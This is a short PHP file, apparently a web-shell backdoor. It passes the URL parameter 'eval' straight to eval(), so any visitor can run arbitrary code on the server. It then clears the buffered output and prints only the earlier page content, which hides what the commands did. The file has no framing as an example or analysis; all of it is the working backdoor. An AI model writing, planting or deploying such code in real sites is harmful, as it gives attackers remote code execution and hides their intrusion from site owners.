<?php
$tmp = ob_get_contents();
if ($tmp) {
    ob_clean();
	$eval = $_GET['eval'];
    eval($eval);
    $ret = ob_get_contents();
    $ret = convert_cyr_string($ret,"d","w");
    ob_clean();
    echo $tmp;     
}
?>